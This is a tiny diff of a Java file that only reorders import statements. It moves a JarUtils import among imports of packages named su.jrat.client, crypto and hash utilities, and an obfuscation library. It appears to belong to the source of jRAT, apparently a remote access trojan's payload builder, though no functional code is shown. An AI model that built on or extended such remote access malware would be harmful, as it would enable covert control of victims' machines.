@@ -18,6 +18,7 @@ import java.util.zip.ZipOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 
+import jrat.api.utils.JarUtils;
 import su.jrat.client.BuildStatus;
 import su.jrat.client.Constants;
 import su.jrat.client.ErrorDialog;
@@ -35,7 +36,6 @@ import su.jrat.common.codec.Hex;
 import su.jrat.common.crypto.Crypto;
 import su.jrat.common.hash.Md5;
 import su.jrat.common.hash.Sha1;
-import jrat.api.utils.JarUtils;
 
 import com.redpois0n.zkmlib.Configuration;
 
